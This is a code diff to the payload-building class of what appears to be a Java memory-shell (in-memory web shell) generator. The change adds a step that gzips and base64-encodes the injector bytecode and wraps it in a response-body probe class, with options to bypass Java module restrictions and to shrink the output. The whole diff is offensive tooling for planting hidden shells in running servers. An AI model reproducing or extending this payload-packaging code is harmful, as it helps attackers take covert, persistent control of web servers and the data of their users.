@@ -6,7 +6,13 @@ import com.reajason.javaweb.memshell.config.ShellConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.memshell.generator.InjectorGenerator;
 import com.reajason.javaweb.memshell.server.AbstractServer;
+import com.reajason.javaweb.probe.ProbeContent;
+import com.reajason.javaweb.probe.ProbeMethod;
+import com.reajason.javaweb.probe.config.ProbeConfig;
+import com.reajason.javaweb.probe.config.ResponseBodyConfig;
+import com.reajason.javaweb.probe.generator.response.ResponseBodyGenerator;
 import com.reajason.javaweb.utils.CommonUtil;
+import org.apache.commons.codec.binary.Base64;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.lang3.tuple.Pair;
 
@@ -59,6 +65,25 @@ public class MemShellGenerator {
 
         InjectorGenerator injectorGenerator = new InjectorGenerator(shellConfig, injectorConfig);
         byte[] injectorBytes = injectorGenerator.generate();
+        if (shellConfig.isProbe() && !shellConfig.getShellType().startsWith(ShellType.AGENT)) {
+            ProbeConfig probeConfig = ProbeConfig.builder()
+                    .shellClassName(injectorConfig.getInjectorClassName() + "1")
+                    .probeMethod(ProbeMethod.ResponseBody)
+                    .probeContent(ProbeContent.Bytecode)
+                    .targetJreVersion(shellConfig.getTargetJreVersion())
+                    .byPassJavaModule(shellConfig.isByPassJavaModule())
+                    .shrink(shellConfig.isShrink())
+                    .debug(shellConfig.isDebug())
+                    .staticInitialize(injectorConfig.isStaticInitialize())
+                    .build();
+            ResponseBodyConfig responseBodyConfig = ResponseBodyConfig.builder()
+                    .server(serverName)
+                    .base64Bytes(Base64.encodeBase64String(CommonUtil.gzipCompress(injectorBytes)))
+                    .build();
+            injectorBytes = new ResponseBodyGenerator(probeConfig, responseBodyConfig).getBytes();
+            injectorConfig.setInjectorClassName(probeConfig.getShellClassName());
+        }
+
         Map<String, byte[]> innerClassBytes = injectorGenerator.getInnerClassBytes();
 
         return MemShellResult.builder()
